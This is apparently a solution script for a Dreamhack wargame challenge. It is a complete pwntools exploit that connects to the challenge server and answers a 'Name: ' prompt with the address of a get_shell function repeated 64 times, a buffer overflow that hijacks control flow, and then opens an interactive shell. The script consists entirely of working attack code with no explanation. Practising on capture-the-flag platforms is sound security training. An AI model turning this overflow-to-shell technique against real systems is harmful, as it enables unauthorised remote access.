from pwn import *

p = remote('host1.dreamhack.games', 23840)

p.recvuntil('Name: ')

get_shell = p32(0x080485db)

p.sendline(get_shell * 64)

p.recvuntil('Name: ')

p.interactive()
